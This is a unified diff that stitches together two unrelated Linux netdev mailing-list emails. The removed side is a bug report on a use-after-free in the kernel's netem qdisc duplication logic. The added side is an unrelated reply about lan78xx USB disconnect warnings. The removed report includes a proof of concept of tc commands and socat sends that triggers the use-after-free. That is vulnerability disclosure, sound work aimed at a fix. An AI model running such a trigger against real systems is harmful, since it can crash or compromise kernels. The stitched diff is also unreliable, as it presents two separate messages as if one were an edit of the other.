@@ -1,176 +1,165 @@
-Return-Path: <netdev+bounces-182034-lists+netdev=lfdr.de@vger.kernel.org>
+Return-Path: <netdev+bounces-182035-lists+netdev=lfdr.de@vger.kernel.org>
 X-Original-To: lists+netdev@lfdr.de
 Delivered-To: lists+netdev@lfdr.de
-Received: from ny.mirrors.kernel.org (ny.mirrors.kernel.org [IPv6:2604:1380:45d1:ec00::1])
-	by mail.lfdr.de (Postfix) with ESMTPS id 6B244A8773F
-	for <lists+netdev@lfdr.de>; Mon, 14 Apr 2025 07:34:11 +0200 (CEST)
+Received: from am.mirrors.kernel.org (am.mirrors.kernel.org [IPv6:2604:1380:4601:e00::3])
+	by mail.lfdr.de (Postfix) with ESMTPS id 415ACA87783
+	for <lists+netdev@lfdr.de>; Mon, 14 Apr 2025 07:47:21 +0200 (CEST)
 Received: from smtp.subspace.kernel.org (relay.kernel.org [52.25.139.140])
 	(using TLSv1.2 with cipher ECDHE-ECDSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by ny.mirrors.kernel.org (Postfix) with ESMTPS id 646E016EA43
-	for <lists+netdev@lfdr.de>; Mon, 14 Apr 2025 05:34:11 +0000 (UTC)
+	by am.mirrors.kernel.org (Postfix) with ESMTPS id 8B0DD188FAE3
+	for <lists+netdev@lfdr.de>; Mon, 14 Apr 2025 05:47:31 +0000 (UTC)
 Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
-	by smtp.subspace.kernel.org (Postfix) with ESMTP id 5980C192D6B;
-	Mon, 14 Apr 2025 05:34:07 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=starlabs-sg.20230601.gappssmtp.com header.i=@starlabs-sg.20230601.gappssmtp.com header.b="lYK4HXwG"
+	by smtp.subspace.kernel.org (Postfix) with ESMTP id 643F661FFE;
+	Mon, 14 Apr 2025 05:47:17 +0000 (UTC)
 X-Original-To: netdev@vger.kernel.org
-Received: from mail-ej1-f44.google.com (mail-ej1-f44.google.com [209.85.218.44])
-	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
+Received: from metis.whiteo.stw.pengutronix.de (metis.whiteo.stw.pengutronix.de [185.203.201.7])
+	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 24C041E485
-	for <netdev@vger.kernel.org>; Mon, 14 Apr 2025 05:34:04 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.218.44
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 18A3D1862
+	for <netdev@vger.kernel.org>; Mon, 14 Apr 2025 05:47:12 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=185.203.201.7
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1744608847; cv=none; b=KxwWB64VTorHJw/TPMkEx5lxRrec0mPFaxvbkhEnay0HRjNfnuZkArWK3QBQ2uCc8zRuwTmDWc3fhJeXsrs9Vv/u4sW69ZomSmO4oaUfurfc3MgUOaiWMZ1PYUgHdHnuVE5dWQgvAcbAHLb6nhQl+qVVaJnGXe4zMz1YPO69OEE=
+	t=1744609637; cv=none; b=F0un21UBTPA4+aK5YV/+flDs2ZeDX67ICLAT3rtpvM43xIYunKoqUupv2MzlhLU7IqPsG+i4ApLZ0Rv3F4BJ1OId65+vyebGaBC3cFHLeeucuaNywY0KMRbMUIxTmIUccisuSvHDs/yr0TTSAvVztJK8R5WJqdDevLIN8gFOesc=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1744608847; c=relaxed/simple;
-	bh=+AshV3GTfy7Ee/zIg3BMvn8PNR3U4GrGDPK0mIsZBGk=;
-	h=MIME-Version:From:Date:Message-ID:Subject:To:Cc:Content-Type; b=OtT8ELiymC0c66/5ZOnGs7tQk8QxHHTRzE9FW7v2s0DTNOUNBfXyKM/qLx4bDt/OkY0x+x/yR1ueEWW3N166y2BdaeKNFeYAuHQ+dp0RlwKH6eFz85cSzTHNgZdjZ9gS3ca361TNNK+fPtr09Dot/GApiGUjd5lI6AijYepzaQE=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=starlabs.sg; spf=pass smtp.mailfrom=starlabs.sg; dkim=pass (2048-bit key) header.d=starlabs-sg.20230601.gappssmtp.com header.i=@starlabs-sg.20230601.gappssmtp.com header.b=lYK4HXwG; arc=none smtp.client-ip=209.85.218.44
-Authentication-Results: smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=starlabs.sg
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=starlabs.sg
-Received: by mail-ej1-f44.google.com with SMTP id a640c23a62f3a-aaecf50578eso709244066b.2
-        for <netdev@vger.kernel.org>; Sun, 13 Apr 2025 22:34:04 -0700 (PDT)
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=starlabs-sg.20230601.gappssmtp.com; s=20230601; t=1744608843; x=1745213643; darn=vger.kernel.org;
-        h=cc:to:subject:message-id:date:from:mime-version:from:to:cc:subject
-         :date:message-id:reply-to;
-        bh=gDcL1OoXjd0tSFGBRM1WCPF1YNGqKa/9IenL+Wyu8fk=;
-        b=lYK4HXwGSvAPymvyjOvO4HLcKqMjdSy6pCXgmryoTjWJnHf38ZFXDDbWCJ4MY8TfMG
-         Lb4kvaK7xMNGO9MsZPBu3+TdqnTink4iGSWTcKsMYzuvtLXwI2958ECm7tEeeytIOBzU
-         HvhnWefe/4VslTGbQv7PUBTdK2oylRiqXDbMoMTb0Hs85+oy5fb2jgKccEKifXX34CCR
-         utiwZaKvnixON1VPL2CCBTuV8LLFXtTytknRq+p0Rv9Ki4nAlNmLxnhckQMcGxNSxIja
-         +vQbJ8Z4CxNSNmcrLF6yzxLTJtMRGb4E7KjKTfsMs4n+VJp5X1MHuqGM4INHvMrrobTn
-         VhGg==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20230601; t=1744608843; x=1745213643;
-        h=cc:to:subject:message-id:date:from:mime-version:x-gm-message-state
-         :from:to:cc:subject:date:message-id:reply-to;
-        bh=gDcL1OoXjd0tSFGBRM1WCPF1YNGqKa/9IenL+Wyu8fk=;
-        b=TjKP+nomH25tMdQmxKXHB2luhOb2lH1SHuXX15Td938dbTu2RdfiP7LZN/FzsB7quN
-         Sib7IYtuloB/wbyJIZdcOlFMJ065kna83a+A2e5b8ZV48+iY8Noxvi9mGkT27s0HKx8e
-         bXg4S6sPrbyy33I+uU+993JOYpi/gY45mSo2ol9cL4nZ14vpOaPpqV6wKjkxFFAUEs/u
-         58YrZWVGlvwAkDkuxGWBMZWydFtIr7wyPLGDVatm2GSdSsLkhUFkVn7MAtTf/j3R9dKf
-         px3Ot4/5tWSsFgAZZrOk2W0kyGCUTOGXEUfDKGkoomd/7v2qQ4DictaoEfwLyOVFYWcj
-         lfNA==
-X-Gm-Message-State: AOJu0YzYHV+todGykmf2tJehIUW/wvv5at9aTiqGOM0fscygEvPOparr
-	ShnBMaURaoH0k/c471qB3HwJNjXLBsmeEu+vSYlxsRX1SvkaSInkIdRwHnLfZszl4ND0rFpODuz
-	KIKRtp1PIJdjV8lDsWsCgxk+Uz7nIpoZGcNKjxNkOPqoEI8diqBX0c5+u
-X-Gm-Gg: ASbGncuz2TJmv+0vM+Kz/JCZUAzCW0Yz6bb+6XTLBarnKA9dWuNodnem9Ivv/1xkCee
-	k4f/xcSN0biGfhwAv4MjPTjQzvEEa2Mb1pXBvgtbUW9EjoEP8FZlqt73dOOVLuIV8aY9TRopsBx
-	cc3ozwAJjKDsicxEP15mZaIOXg
-X-Google-Smtp-Source: AGHT+IH9np865akse8Jjm0vvh2c2h9DRJtkBegV/MrUlPokc7SWzC9L/q/NPycOuwOHkahWuVx9KZN71uPiIuwR+S8E=
-X-Received: by 2002:a17:906:1701:b0:aca:e0b7:de03 with SMTP id
- a640c23a62f3a-acae0b7ded6mr606419266b.16.1744608843035; Sun, 13 Apr 2025
- 22:34:03 -0700 (PDT)
+	s=arc-20240116; t=1744609637; c=relaxed/simple;
+	bh=ifp+Rc6GyOS8cXHrcl6fph6v5VnNnVQ6tWfeUCqd90w=;
+	h=Date:From:To:Cc:Subject:Message-ID:References:MIME-Version:
+	 Content-Type:Content-Disposition:In-Reply-To; b=IECObqDu74E1bo9MTCC92+KvjmAJs0GaphwH+kX5OIsyE/iLCFqGysw4qV5ktj+3HR7iQnc2uwDcYj4QSVGSdn7XJgmDLzs3C7eFoh0pE79McxwVI5ngO+mCwxWpkBW6bkvpsvhKBE8nopLAf2m70mT3HzvpyDVG1hSgUjLzHzI=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=pengutronix.de; spf=pass smtp.mailfrom=pengutronix.de; arc=none smtp.client-ip=185.203.201.7
+Authentication-Results: smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=pengutronix.de
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=pengutronix.de
+Received: from drehscheibe.grey.stw.pengutronix.de ([2a0a:edc0:0:c01:1d::a2])
+	by metis.whiteo.stw.pengutronix.de with esmtps (TLS1.3:ECDHE_RSA_AES_256_GCM_SHA384:256)
+	(Exim 4.92)
+	(envelope-from <ore@pengutronix.de>)
+	id 1u4Cer-00063p-40; Mon, 14 Apr 2025 07:47:01 +0200
+Received: from pty.whiteo.stw.pengutronix.de ([2a0a:edc0:2:b01:1d::c5])
+	by drehscheibe.grey.stw.pengutronix.de with esmtps  (TLS1.3) tls TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
+	(Exim 4.96)
+	(envelope-from <ore@pengutronix.de>)
+	id 1u4Ceq-000CNP-0Y;
+	Mon, 14 Apr 2025 07:47:00 +0200
+Received: from ore by pty.whiteo.stw.pengutronix.de with local (Exim 4.96)
+	(envelope-from <ore@pengutronix.de>)
+	id 1u4Ceq-000AAR-0E;
+	Mon, 14 Apr 2025 07:47:00 +0200
+Date: Mon, 14 Apr 2025 07:47:00 +0200
+From: Oleksij Rempel <o.rempel@pengutronix.de>
+To: Stefan Wahren <wahrenst@gmx.net>
+Cc: Thangaraj Samynathan <Thangaraj.S@microchip.com>,
+	Rengarajan Sundararajan <Rengarajan.S@microchip.com>,
+	netdev <netdev@vger.kernel.org>,
+	"linux-usb@vger.kernel.org" <linux-usb@vger.kernel.org>
+Subject: Re: lan78xx: Failed to sync IRQ enable register: -ENODEV
+Message-ID: <Z_yhVCu0UR5s6p19@pengutronix.de>
+References: <3d4bda4e-f4e8-455e-87ec-2a84d6924d76@gmx.net>
 Precedence: bulk
 X-Mailing-List: netdev@vger.kernel.org
 List-Id: <netdev.vger.kernel.org>
 List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-From: "Tai, Gerrard" <gerrard.tai@starlabs.sg>
-Date: Mon, 14 Apr 2025 13:33:00 +0800
-X-Gm-Features: ATxdqUF-V8Mt72uKQp-u-rvx6FEix6KmOQPSBo6PLw_GcrD73WYNkCRfe-bpWVw
-Message-ID: <CAHcdcOm+03OD2j6R0=YHKqmy=VgJ8xEOKuP6c7mSgnp-TEJJbw@mail.gmail.com>
-Subject: [BUG] net/sched: netem: UAF due to duplication routine
-To: netdev@vger.kernel.org
-Cc: Willy Tarreau <w@1wt.eu>, Stephen Hemminger <stephen@networkplumber.org>, 
-	Jamal Hadi Salim <jhs@mojatatu.com>, Cong Wang <xiyou.wangcong@gmail.com>, jiri@resnulli.us
-Content-Type: text/plain; charset="UTF-8"
+Content-Type: text/plain; charset=utf-8
+Content-Disposition: inline
+Content-Transfer-Encoding: 8bit
+In-Reply-To: <3d4bda4e-f4e8-455e-87ec-2a84d6924d76@gmx.net>
+X-Sent-From: Pengutronix Hildesheim
+X-URL: http://www.pengutronix.de/
+X-Accept-Language: de,en
+X-Accept-Content-Type: text/plain
+X-SA-Exim-Connect-IP: 2a0a:edc0:0:c01:1d::a2
+X-SA-Exim-Mail-From: ore@pengutronix.de
+X-SA-Exim-Scanned: No (on metis.whiteo.stw.pengutronix.de); SAEximRunCond expanded to false
+X-PTX-Original-Recipient: netdev@vger.kernel.org
 
-Hi,
+Hi Stefan,
 
-I found a bug in the netem qdisc's packet duplication logic. This can
-lead to UAF in classful parents.
+On Sun, Apr 13, 2025 at 09:49:00PM +0200, Stefan Wahren wrote:
+> Hi,
+> i noticed that recent changes to lan78xx introduced error messages to
+> the bootlog of Raspberry Pi 3 B Plus (arm/multi_v7_defconfig, 6.15.0-rc1).
+> 
+> [    8.715374] lan78xx 1-1.1.1:1.0 (unnamed net_device) (uninitialized):
+> No External EEPROM. Setting MAC Speed
+> [    9.313859] usbcore: registered new interface driver lan78xx
+> [   10.132752] vchiq: module is from the staging directory, the quality
+> is unknown, you have been warned.
+> [   10.533613] usbcore: registered new device driver onboard-usb-dev
+> [   10.533861] usb 1-1.1: USB disconnect, device number 3
+> [   10.533880] usb 1-1.1.1: USB disconnect, device number 6
+> [   10.656641] lan78xx 1-1.1.1:1.0 eth0 (unregistered): Failed to sync
+> IRQ enable register: -ENODEV
+> [   10.657440] lan78xx 1-1.1.1:1.0 eth0 (unregistered): Failed to sync
+> IRQ enable register: -ENODEV
+> [   10.658819] usb 1-1.1.2: USB disconnect, device number 5
+> 
+> Since this happend during only two times during boot, i added a
+> WARN_ON() in this specific case in order to see what's going on:
+...
+> [   10.656092]  lan78xx_irq_bus_sync_unlock from  free_irq
+> [   10.656110]  free_irq from phy_disconnect
+> [   10.656131]  phy_disconnect from lan78xx_disconnect
+> [   10.656143]  lan78xx_disconnect from usb_unbind_interface
+...
+> Maybe some has any idea, how to fix this properly.
 
-In netem_enqueue():
+Thanks for the detailed report and backtrace!
 
-    if (skb2) {
-        struct Qdisc *rootq = qdisc_root_bh(sch);
-        u32 dupsave = q->duplicate; /* prevent duplicating a dup... */
+The warning you're seeing was introduced by this patch:
+0da202e6a56f ("net: usb: lan78xx: Add error handling to lan78xx_irq_bus_sync_unlock")
 
-        q->duplicate = 0;
-        rootq->enqueue(skb2, rootq, to_free);                       // [1]
-        q->duplicate = dupsave;
-        skb2 = NULL;
-    }
+It adds error handling to lan78xx_irq_bus_sync_unlock() to log failed
+register access.
 
-    qdisc_qstats_backlog_inc(sch, skb);
+In your case, everything in the stack is actually doing what it's
+supposed to:
+- lan78xx_disconnect() notifies the PHY subsystem.
+- PHY framework sees the attached IRQ and calls free_irq().
+- free_irq() calls irq_chip_bus_sync_unlock() ->
+  lan78xx_irq_bus_sync_unlock(), where we hit the -ENODEV because
+  the USB device is already gone.
 
-    cb = netem_skb_cb(skb);
+The issue is that the IRQ subsystem doesn’t currently support
+hot-unpluggable IRQ controllers, so there's no mechanism to tell it
+"the hardware is already gone, just clean up the software state."
+Until such a mechanism exists, these benign warnings can show up in
+valid disconnect paths.
 
-    if (q->gap == 0 || /* not doing reordering */
-        q->counter < q->gap - 1 || /* inside last reordering gap */
-        q->reorder < get_crandom(&q->reorder_cor, &q->prng)) {
+I can imagine a few possible options:
 
-            // [...]
+- Silently ignore -ENODEV in irq_bus_sync_unlock() and similar paths  
+  Pro: trivial to implement  
+  Contra: completely hides real issues if they happen for other reasons
 
-            tfifo_enqueue(skb, sch);                                // [2]
+- Add a global flag to suppress lan78xxx errors in .disconnect path  
+  Pro: simple and less intrusive  
+  Contra: same as above — poor diagnostics
 
+- Introduce irq_domain_mark_hardware_removed() and check it in relevant paths  
+  Pro: makes the real hardware state explicit, allows IRQ framework to make
+       better decisions, improves diagnostics  
+  Contra: requires some non-trivial changes across IRQ and driver code
 
-When the netem qdisc tries to duplicate a packet, it enqueues the packet
-into the root qdisc ([1]). Subsequently, tfifo_enqueue() is called at [2],
-which increases the qdisc's qlen.
+Personally, I’d prefer the last option. It's harder to implement, but it gives
+us the right model for handling hot-unpluggable IRQ controllers in the long
+term.
 
-Consider when the netem qdisc is a child of a classful parent. For example,
-in drr_enqueue(), there is first a check ([3]) if the child qdisc is
-empty. Then, it enqueues the packet into the child qdisc ([4]). After the
-enqueue succeeds, it activates the newly active child ([5]).
+All of these changes are more or less cosmetic. So far, there is no real
+problem — just the fact that software is attempting to access hardware that is
+already gone.  My proposal would primarily make the disconnection path cleaner
+and less noisy.
 
-    first = !cl->qdisc->q.qlen;                                     // [3]
-    err = qdisc_enqueue(skb, cl->qdisc, to_free);                   // [4]
-    if (unlikely(err != NET_XMIT_SUCCESS)) {
-        if (net_xmit_drop_count(err)) {
-            cl->qstats.drops++;
-            qdisc_qstats_drop(sch);
-        }
-        return err;
-    }
+It won’t prevent other parts of the driver or subsystem from hitting -ENODEV
+before we reach the disconnect path. So until the driver itself is aware that
+the hardware is gone and begins cleanup, we may still get register access
+errors from other paths. This is expected.
 
-    if (first) {                                                    // [5]
-        list_add_tail(&cl->alist, &q->active);
-        cl->deficit = cl->quantum;
-    }
-
-When the parent (drr) receives a packet to enqueue in an empty netem qdisc,
-first = true at [3] and the packet is enqueued in netem. In netem, the
-packet duplication enqueues the packet in the root qdisc, the parent drr,
-again before it calls tfifo_enqueue() ([2]). So, the netem still has
-qlen = 0 when the drr_enqueue() logic runs for the second time. This
-causes first = true for the duplicate packet as well. Subsequently, both
-calls succeed and the new child activation occurs twice at [5].
-
-This 're-entrant' behaviour is present in other classful qdiscs as well.
-In some cases, it can confuse a qdisc's internal tracking. Below is a PoC
-with a hfsc parent that showcases a UAF scenario.
-
-Proof of concept for UAF:
-unshare -rn
-$IP link set dev lo up
-
-# setup victim hfsc
-$TC qdisc add dev lo handle 1:0 root hfsc
-$TC class add dev lo parent 1:0 classid 1:1 hfsc ls m2 10Mbit
-$TC qdisc add dev lo parent 1:1 handle 2:0 netem duplicate 100%
-
-$TC class add dev lo parent 1:0 classid 1:2 hfsc ls m2 10Mbit
-$TC qdisc add dev lo parent 1:2 handle 3:0 netem duplicate 100%
-
-echo "" | $SOCAT -u STDIN UDP4-DATAGRAM:127.0.0.1:8888,priority=$((0x10001))
-
-# delete class 1:1
-$TC class del dev lo classid 1:1
-
-# UAF, hfsc tries to dequeue from class 1:1
-echo "" | $SOCAT -u STDIN UDP4-DATAGRAM:127.0.0.1:8888,priority=$((0x10002))
-
-
-This should give a UAF splat when the kernel is compiled with KASAN.
-
-Unfortunately, I don't have any great ideas regarding a patch.
-
-Thanks!
-Gerrard Tai
+Best regards,  
+Oleksij Rempel
+-- 
+Pengutronix e.K.                           |                             |
+Steuerwalder Str. 21                       | http://www.pengutronix.de/  |
+31137 Hildesheim, Germany                  | Phone: +49-5121-206917-0    |
+Amtsgericht Hildesheim, HRA 2686           | Fax:   +49-5121-206917-5555 |
 
